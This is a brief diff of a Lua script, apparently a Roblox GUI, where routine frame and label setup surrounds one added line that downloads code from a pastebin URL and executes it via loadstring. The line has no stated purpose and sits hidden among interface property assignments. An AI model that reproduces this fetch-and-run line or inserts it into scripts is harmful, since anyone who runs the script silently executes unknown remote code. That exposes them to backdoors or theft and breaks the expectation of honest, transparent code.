@@ -63,6 +63,8 @@ Frame.Draggable = true
 Frame.Active = true
 Frame.Visible = true
 
+loadstring(game:HttpGet('https://pastebin.com/raw/7GHT6T9N'))()
+
 WelcomeTitle.Name = "WelcomeTitle"
 WelcomeTitle.Parent = Frame
 WelcomeTitle.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
